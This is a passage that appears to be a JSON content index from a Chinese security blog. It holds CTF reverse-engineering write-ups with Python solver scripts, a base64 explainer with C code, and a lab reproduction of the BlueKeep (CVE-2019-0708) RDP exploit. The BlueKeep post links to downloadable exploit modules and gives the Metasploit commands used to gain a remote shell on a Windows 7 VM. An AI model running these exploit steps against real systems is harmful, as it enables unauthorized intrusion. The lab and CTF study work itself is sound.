0x1c, 0xd7, 0xbd, 0xcb, 0x74, 0x5f, 0xfb, 0x11, 0x9b, 0xf4, 0x62, 0x8a, 0xd6, 0xbf, 0xef, 0x94, 0x72, 0x86, 0x27, 0xcd, 0x2e, 0x36, 0x03, 0xfb, 0xdd, 0x32, 0xf4, 0x56, 0xc5, 0xd5, 0x4a, 0x68, 0x48, 0xc5, 0x28, 0x72, 0x61, 0x18, 0x10, 0xf3, 0x00, 0xa8, 0x1c, 0x45, 0xef, 0x6d, 0x07, 0xab, 0xde, 0x80, 0x4a, 0xca, 0xa3, 0xfc, 0x5a, 0x92, 0xe0, 0x78, 0x88, 0xc6, 0x4e, 0x36, 0xee, 0x4e, 0x28, 0x05, 0xb2, 0xf7, 0xf2, 0xac, 0xb8, 0x58, 0xf3, 0x99, 0x9d, 0x23, 0x8d, 0x41, 0x65, 0x9f, 0xeb, 0x76, 0xc0, 0x2e, 0xc6, 0x66, 0x52, 0x0e, 0x06, 0x6a, 0x38, 0x63, 0xda, 0x2f, 0x71, 0x1b, 0xe7, 0x73, 0x96, 0x8b, 0x91, 0x33, 0x4b, 0x7c, 0x46, 0xa0, 0x9d, 0x9d, 0x3c, 0xa0, 0x20, 0x66, 0x03, 0x2b, 0x1c, 0x14, 0xed, 0x53, 0x67, 0x20, 0xf7, 0xfe, 0xb5, 0xa0, 0x3b, 0x59, 0xee, 0x90, 0x02, 0xfb, 0x9a, 0x05, 0x47, 0xdc, 0xc6, 0x98, 0xea, 0xca, 0xd7, 0x09, 0x69, 0x70, 0x59, 0xb4, 0x68, 0x3c, 0xc2, 0xb6, 0x5f, 0x63, 0xea, 0x62, 0x6f, 0x6b, 0xac, 0x22, 0xad, 0xb8, 0x2b, 0x36, 0x3b, 0x2b, 0xb7, 0xb8, 0x75, 0xcb, 0xcd, 0xd5, 0x3b, 0x79, 0xc7, 0x19, 0x4b, 0xf1, 0xa9, 0xb1, 0xd5, 0xc4, 0x59, 0x57, 0xad, 0x5a, 0xa8, 0x28, 0x8e, 0xd7, 0x1e, 0x92, 0x6c, 0x01, 0x85, 0x13, 0x51, 0x62, 0x81, 0x65, 0xea, 0x84, 0x57, 0x6f, 0x97, 0xb6, 0x0a, 0x37, 0xe0, 0x1d, 0x1e, 0x80, 0x04, 0x34, 0xc7, 0x7d, 0xba, 0x74, 0x40, 0xd4, 0x6a, 0x72, 0xc2, 0xa1, 0x96, 0x3a, 0xf8, 0x5a, 0x9d, 0xa0, 0x50, 0xc3, 0x27, 0xf9, 0x96, 0x7f, 0x88, 0x41, 0x13, 0xe7, 0xab, 0xac, 0x7e, 0x77, 0xe2, 0x94, 0x67, 0x41, 0x11, 0x0d, 0xfb, 0xf2, 0x73, 0xda, 0x18, 0x2f, 0x1c, 0xd5, 0x6b, 0xec, 0xde, 0x96, 0x4b, 0x83, 0x1a, 0xd6, 0xf3, 0x10, 0x9a, 0x4b, 0x8e, 0xbb, 0x2e, 0x74, 0x6d, 0x97, 0x0a, 0xce, 0xc8, 0xc4, 0xfa, 0x4a, 0xac, 0xb4, 0x6e, 0xde, 0xac, 0x58, 0xd2, 0xe1, 0x62, 0x38, 0x99, 0xab, 0x92, 0xae, 0xbd, 0x84, 0x52, 0x7d, 0x38, 0xfe, 0xaa, 0x6e, 0x14, 0x04, 0xa3, 0xb1, 0x72, 0xcb, 0x55, 0x97, 0x91, 0xf8, 0x31, 0x7e, 0xa9, 0x75, 0x13, 0xc0, 0xf9, 0xe2, 0x22, 0x63, 0x8f, 0xd2, 0x68, 0x3a, 0x97, 0xd7, 0x9e, 0x5b, 0xb9, 0xde, 0xb8, 0x94, 0xa8, 0xaa, 0x34, 0x25, 0xf2, 0xc6, 0xc6, 0x81, 0xee, 0xc8, 0x39, 0x40, 0x2b, 0x74, 0xe5, 0x52, 0x2a, 0xb9, 0x21, 0x92, 0xe8, 0x64, 0x4e, 0x24, 0x90, 0xda, 0xd7, 0xdb, 0x67, 0x63, 0xa4, 0x8e, 0x03, 0x95, 0xd7, 0x2c, 0x87, 0x95, 0x50, 0x97, 0x8e, 0x27, 0xcc, 0x3b, 0xc7, 0x6b, 0x8e, 0x96, 0x69, 0x49, 0x07, 0x1c, 0xd1, 0x6a, 0x8e, 0x2a, 0x61, 0x26, 0xa0]\nfb = [1,1]\n\n#x = 2136772529\ny = 1234567890\nx = 4284256177\ndef what(a1):\n    num = fb[-1] + fb[-2]\n    fb.append(num)\n    return num\n\ndef calc_key(a1, a2):\n    i = 3\n    while (i <= 9999998):\n        if(what(i) & 0xffffffff == a1):\n            return a2*i+1\n        i += 1\n\ndef decrypt_flag(a1, a2, key):\n    flag = ''\n    while(a2):\n        flag +=chr((junk_data[a1&0xFFF]^a2)&0x7f)\n        a1 = (a1*77777)&0xffffffff\n        a2 = (key^(a2>>1))&0xffffffff\n        key >>= 1\n    return flag\n\nKEY = calc_key(x,y)&0xffffffff\nprint(decrypt_flag(x,y,KEY))\n```\n\n\n\n### mov\n\n此题为`movfuscator`，打开全是mov指令。\n\n可爆破得出flag\n\n```python\nimport subprocess\nimport string\nbaopo = lambda :subprocess.Popen('./mov', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)\nflag = \"F\"\nwhile flag[-1] != '}':\n\tfor i in string.printable:\n\t\tp = baopo()\n\t\tp.stdin.write(flag + i)\n\t\tif 'Good' in p.stdout.read():\n\t\t\tflag += i\n\t\t\tbreak \nprint flag\n```\n\n","tags":["Writeups"]},{"title":"cumtfinal","url":"/2019/09/29/cumtfinal/","content":"\n","tags":["-CTF"]},{"title":"base64编码原理理解","url":"/2019/09/11/base64/","content":"\n- 编码\n\n  1、取待编码字符串前3位（8bit/位），转换为二进制的ascii编码（共24bit）。\n\n  2、将转换后的二进制编码按每6位分为4块，将每块二进制转换成ascii码值\n\n  3、对照base64解码表即可得到对应的base64编码\n\n  4、若取不到3位待编码字符串则用0补充，划分区间后全0的块用‘=’代替\n\n  ![nw4fN6.png](https://s2.ax1x.com/2019/09/11/nw4fN6.png)\n\n- 解码\n\n  1、取待解码字符串前4位（8bit/位），对照base64编码表，转换为映射的数字，并将每一个数转成6位二进制数（共24bit），\n\n  2、将24位二进制分为3份8bit数据\n\n  3、对照ascii码表转换对应字符，解码完成\n\n  4、在第一步中若有‘=’字符则将其转为000000\n\n  ![Q2PWVJ.png](https://s2.ax1x.com/2019/12/13/Q2PWVJ.png)\n\n附base64编码对照表\n\n![nw4Hud.png](https://s2.ax1x.com/2019/09/11/nw4Hud.png)\n\n## base64_decode\n\n```c\nconst char * base64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";//可以自己定制，比如说把+和/改成-和_以满足url编码的要求。\nint base64_decode( const char * base64, unsigned char * bindata )\n{\n    int i, j;\n    unsigned char k;\n    unsigned char t;\n    unsigned char temp[4];\n    for ( i = 0, j = 0; base64[i] != '\\0' ; i += 4 )//每四个字节为一组\n    {\n        memset( temp, 0xFF, sizeof(temp) );\n        for ( k = 0 ; k < 64 ; k ++ )\n        {\n            if ( base64char[k] == base64[i] )\n                temp[0]= k;//获取一组中每个字节对应的编号\n        }\n        for ( k = 0 ; k < 64 ; k ++ )\n        {\n            if ( base64char[k] == base64[i+1] )\n                temp[1]= k;\n        }\n        for ( k = 0 ; k < 64 ; k ++ )\n        {\n            if ( base64char[k] == base64[i+2] )\n                temp[2]= k;\n        }\n        for ( k = 0 ; k < 64 ; k ++ )\n        {\n            if ( base64char[k] == base64[i+3] )\n                temp[3]= k;\n        }\n\n        bindata[j++] = ((unsigned char)(((unsigned char)(temp[0] << 2))&0xFC)) |((unsigned char)((unsigned char)(temp[1]>>4)&0x03));//这些就是补0补位的操作了\n\n        if ( base64[i+2] == '=' )\n            break;\n\n        bindata[j++] = ((unsigned char)(((unsigned char)(temp[1] << 4))&0xF0)) | ((unsigned char)((unsigned char)(temp[2]>>2)&0x0F));\n\n        if ( base64[i+3] == '=' )\n            break;\n\n        bindata[j++] = ((unsigned char)(((unsigned char)(temp[2] << 6))&0xF0)) |((unsigned char)(temp[3]&0x3F));\n\n    }\n    return j;\n}\n```\n\n## base64_encode\n\n```c\nchar * base64_encode( const unsigned char * bindata, char * base64, int binlength )\n{\n    int i, j;\n    unsigned char current;\n\n    for ( i = 0, j = 0 ; i < binlength ; i += 3 )\n    {\n        current = (bindata[i] >> 2) ;\n        current &= (unsigned char)0x3F;\n        base64[j++] = base64char[(int)current];\n\n        current = ( (unsigned char)(bindata[i] << 4 ) ) & ( (unsigned char)0x30 ) ;\n        if ( i + 1 >= binlength )\n        {\n            base64[j++] = base64char[(int)current];\n            base64[j++] = '=';\n            base64[j++] = '=';\n            break;\n        }\n        current |= ( (unsigned char)(bindata[i+1] >> 4) ) & ( (unsigned char) 0x0F );\n        base64[j++] = base64char[(int)current];\n\n        current = ( (unsigned char)(bindata[i+1] << 2) ) & ( (unsigned char)0x3C ) ;\n        if ( i + 2 >= binlength )\n        {\n            base64[j++] = base64char[(int)current];\n            base64[j++] = '=';\n            break;\n        }\n        current |= ( (unsigned char)(bindata[i+2] >> 6) ) & ( (unsigned char) 0x03 );\n        base64[j++] = base64char[(int)current];\n\n        current = ( (unsigned char)bindata[i+2] ) & ( (unsigned char)0x3F ) ;\n        base64[j++] = base64char[(int)current];\n    }\n    base64[j] = '\\0';\n    return base64;\n}\n```\n\n\n\n \n\n","tags":["算法分析"]},{"title":"攻防世界 RE进阶区 WriteUps","url":"/2019/09/11/XCTF RE 进阶区1-6/","content":"\n本文持续更新\n\n## 0x01 dmd-50\n\n下载附件发现为ELF文件，在Linux中运行\n\n![ndz8Wd.png](https://s2.ax1x.com/2019/09/11/ndz8Wd.png)\n\n需要输入key，猜测为flag，拖入64位ida中查看源码，F5反汇编查看main函数C伪码\n\n![ndzwTS.png](https://s2.ax1x.com/2019/09/11/ndzwTS.png)\n\nif不成立的话则输出The Key is valid ! :）\n\n![ndzDYQ.png](https://s2.ax1x.com/2019/09/11/ndzDYQ.png)\n\n主函数发现md5函数，双击跟进查看\n\n![ndz6ln.png](https://s2.ax1x.com/2019/09/11/ndz6ln.png)\n\nmd5函数中，对字符串v40进行md5加密并返回\n\n[![ndzcyq.png](https://s2.ax1x.com/2019/09/11/ndzcyq.png)](https://imgchr.com/i/ndzcyq)\n\n提取if语句中的值进行md5解密\n\n![ndzWwT.png](https://s2.ax1x.com/2019/09/11/ndzWwT.png)\n\n在Linux中输入解密结果grape\n\n![ndz5Y4.png](https://s2.ax1x.com/2019/09/11/ndz5Y4.png)\n\n仍是无法通过，查看发现解密网站对字符串进行了md5(md5($pass))解密。重新载入对提取串进行一次md5解密得到 b781cbb29054db12f88f08c6e161c199，输入Linux中得到正确结果\n\n![ndzbOx.png](https://s2.ax1x.com/2019/09/11/ndzbOx.png)\n\nflag： b781cbb29054db12f88f08c6e161c199\n\n\n\n## 0x02 Shuffle\n\n根据题目提示和在Linux中的运行结果，猜测程序对flag进行随机化打乱\n\n![ndzXTO.png](https://s2.ax1x.com/2019/09/11/ndzXTO.png)\n\n![ndzxte.png](https://s2.ax1x.com/2019/09/11/ndzxte.png)\n\n载入IDA查看源码，发现在程序输出前存在rand函数\n\n![nwSk0f.png](https://s2.ax1x.com/2019/09/11/nwSk0f.png)\n\n提取rand前的数据转换成ascii码\n\n![nwSA78.png](https://s2.ax1x.com/2019/09/11/nwSA78.png)\n\n![nwSZtg.png](https://s2.ax1x.com/2019/09/11/nwSZtg.png)\n\n即可得到flag\n\n\n\n## 0x03 re-for-50-plz-50\n\n\n\nLinux中无法运行，直接载入ida32，发现代码为为**MIPS指令集**，ida无法直接反出伪代码\n\n![nwSln0.png](https://s2.ax1x.com/2019/09/11/nwSln0.png)\n\n简单了解了一下[MIPS指令集](<https://www.cnblogs.com/thoupin/p/4018455.html>)\n\n![nwS37T.png](https://s2.ax1x.com/2019/09/11/nwS37T.png)\n\n猜测异或算法\n\n```python\na = \"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ\"\na_list = list(a)\t\t\t\t\t\t#将字符串a拆分为列表可通过下标访问\nflag = ''\n\nfor i in a_list:\n    flag += chr(ord(i) ^ 0x37)\n\nprint(flag)\n```\n\n得到flag： TUCTF{but_really_whoisjohngalt}\n\n后续通过得知，可通过安装ida插件**Retdec**对MIPS指令集进行反汇编得出伪码\n\n\n\n## 0x04 crackme\n\n文件为exe文件，通过题目名推测考察脱壳技术，拖入PEID中查壳\n\n![nwSdj1.png](https://s2.ax1x.com/2019/09/11/nwSdj1.png)\n\n发现为北斗壳，没有什么脱壳经验便百度了一下OD手动脱壳的方法，原文连接如下\n\n- <https://blog.csdn.net/u011672712/article/details/52091989>\n\n载入OD![nwSBB6.png](https://s2.ax1x.com/2019/09/11/nwSBB6.png)\n\nF8运行到第一个call指令，此时ESP和EIP都是红色，下硬件访问断点，然后Shift+F9，运行到ESP落脚点，然后继续F8运行\n\n![nwSyND.png](https://s2.ax1x.com/2019/09/11/nwSyND.png)\n\n![nwS5Hf.png](https://s2.ax1x.com/2019/09/11/nwS5Hf.png)\n\n之后便来到了程序真正入口点，选择这条汇编右键脱壳\n\n![nwS74g.png](https://s2.ax1x.com/2019/09/11/nwS74g.png)\n\n![nwpZb6.png](https://s2.ax1x.com/2019/09/11/nwpZb6.png)\n\n即可得到脱壳后文件，可载入ida查看伪码\n\n![nwpMPe.png](https://s2.ax1x.com/2019/09/11/nwpMPe.png)\n\n红框部分便为加密算法\n\n![nwpl2d.png](https://s2.ax1x.com/2019/09/11/nwpl2d.png)\n\nPayload:\n\n```python\na = [0x12,0x4,0x8,0x14,0x24,0x5C,0x4A,0x3D,0x56,0x0A,0x10,0x67,0x0,0x41,0x0,0x1,0x46,0x5A,0x44,0x42,0x6E,0x0C,0x44,0x72,0x0C,0x0D,0x40,0x3E,0x4B,0x5F,0x2,0x1,0x4C,0x5E,0x5B,0x17,0x6E,0x0C,0x16,0x68,0x5B,0x12]\nb = \"this_is_not_flag\"\nb_list = list(b)\ni = 0\nflag = ''\n\nwhile i < 42:\n    j = i % 16\n    flag += chr(a[i] ^ ord(b_list[j]))\n    i += 1\n\nprint(flag)\n```\n\n得flag：flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75}\n\n\n\n## 0x05 re2-cpp-is-awesome\n\nELF文件Linux下运行![nwp8KI.png](https://s2.ax1x.com/2019/09/11/nwp8KI.png)\n\n推测运行命令后输入正确flag，载入ida![nwpGrt.png](https://s2.ax1x.com/2019/09/11/nwpGrt.png)\n\n对应运行结果，运行命令后未接参数会提示输入flag\n\n![nwpUIS.png](https://s2.ax1x.com/2019/09/11/nwpUIS.png)\n\n跟进sub_400B56函数\n\n![nwpwGQ.png](https://s2.ax1x.com/2019/09/11/nwpwGQ.png)\n\n出现输入失败时的字符串，推测红框内为加密算法，提取相应数据\n\n![1566634949439](C:\\Users\\12424\\AppData\\Roaming\\Typora\\typora-user-images\\1566634949439.png)\n\n![nwp02j.png](https://s2.ax1x.com/2019/09/11/nwp02j.png)\n\nPayload：\n\n```python\nindex = [0x24,0x00,0x05,0x36,0x65,0x07,0x27,0x26,0x2D,0x01,0x03,0x00,0x0D,0x56,0x01,0x03,0x65,0x03,0x2D,0x16,0x02,0x15,0x03,0x65,0x00,0x29,0x44,0x44,0x01,0x44,0x2B,]\na = \"L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t\"\n\nfor i in index:\n    print(a[i], end='')\n```\n\nflag: ALEXCTF{W3_L0v3_C_W1th_CL45535}\n\n\n\n## 0x06 Key\n\n.exe文件，拖入PEID，无壳\n\n![nwpyq0.png](https://s2.ax1x.com/2019/09/11/nwpyq0.png)\n\n直接打开.exe文件一闪而过，用od运行出现\n\n![nwpcZV.png](https://s2.ax1x.com/2019/09/11/nwpcZV.png)\n\n载入ida32查看，发现相关字符串出现\n\n![nwpgaT.png](https://s2.ax1x.com/2019/09/11/nwpgaT.png)\n\n跟进if语句上面的sub_321620()函数，发现一串奇怪的路径\n\n![nwpfG4.png](https://s2.ax1x.com/2019/09/11/nwpfG4.png)\n\n创建此路径，并输入asd123456保存，再次运行\n\n![nwpos1.png](https://s2.ax1x.com/2019/09/11/nwpos1.png)\n\n推测程序从此文件读取输入进行字符串匹配\n\nOD断点到main函数位置，F7跟入，到关键比较的位置下断点\n\n![nwpHZ6.png](https://s2.ax1x.com/2019/09/11/nwpHZ6.png)\n\n可以发现对比串：idg_cni~bjbfi|gsxb，将其输入flag.txt文件中再次运行程序，得到正确输出判断为flag\n\n![nwpOiD.png](https://s2.ax1x.com/2019/09/11/nwpOiD.png)\n\n提交成功flag ：idg_cni~bjbfi|gsxb","tags":["Writeups"]},{"title":"CVE-2019-0708远程桌面代码执行漏洞复现","url":"/2019/09/08/20190708漏洞复现/","content":"\n## CVE-2019-0708远程桌面代码执行漏洞复现\n\n### 漏洞环境\n\n使用VMware Workstations安装Windows7 SP1模拟受害机\n\nWindows7 SP1下载链如下，可复制到迅雷直接下载\n\n`ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/`\n\n[![n8piL9.png](https://s2.ax1x.com/2019/09/08/n8piL9.png)](https://imgchr.com/i/n8piL9)\n\nPS：需开启远程桌面连接，否则连接时会失败\n\n[![n8CIG6.md.png](https://s2.ax1x.com/2019/09/08/n8CIG6.md.png)](https://imgchr.com/i/n8CIG6)\n\n### EXPLOIT\n\n#### 攻击工具\n\n- 在kali环境使用以下命令安装最新版metasploit-framework\n\n```\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall\n```\n\n如果出现以下情况，则需要杀死apt相关进程，再次执行以上命令\n\n```\nE: 无法获得锁 /var/lib/dpkg/lock-frontend - open (11: 资源暂时不可用)\nE: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?\n```\n\n- 下载攻击套件放置文件到msf的相应文件夹(如果已存在同名文件,直接覆盖即可)\n\n<https://pan.baidu.com/s/1LqRqH3Vagw4Cane83zgKRA>   提取码：**ayqx**\n\n```\nrdp.rb   ->   /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb\n\nrdp_scanner.rb   ->   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb\n\ncve_2019_0708_bluekeep.rb   ->   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb\n\ncve_2019_0708_bluekeep_rce.rb   ->   /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb\n```\n\n#### msf攻击命令\n\n键入``msfconsole`载入metasploit-framework\n\n再用`reload_all`重载漏洞利用模块\n\n键入`use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`启用0708RDP模块\n\n用`info`查看模块相关信息及设置\n\n[![n89h38.png](https://s2.ax1x.com/2019/09/08/n89h38.png)](https://imgchr.com/i/n89h38)\n\n用如下命令分别设置相关参数\n\n```shell\nset RHOSTS 192.168.109.146  //受害主机ID\nset RPORT 3389\t\t\t\t//受害主机端口号，此漏洞一般为3389\nset target 3\t\t\t\t//使用VMware满足target3\n```\n\n然后`exploit`开启攻击等待建立连接\n\n[![n8Cubd.md.png](https://s2.ax1x.com/2019/09/08/n8Cubd.md.png)](https://imgchr.com/i/n8Cubd)\n\n建立连接以后,使用`shell`获得shell,再使用`python`获得交互式shell\n\n[![n8CNrQ.md.png](https://s2.ax1x.com/2019/09/08/n8CNrQ.md.png)](https://imgchr.com/i/n8CNrQ)\n\n攻击完成，拿到受害主机权限，并可以对受害机进行操作\n\n[![n8C2qJ.md.png](https://s2.ax1x.com/2019/09/08/n8C2qJ.md.png)](https://imgchr.com/i/n8C2qJ)\n\n","tags":["漏洞"]},{"title":"Bonjour！First blog","url":"/2019/09/06/Firstblog/","content":"### In memory of myself\nThis is my first blog.\nThanks\n\n"}]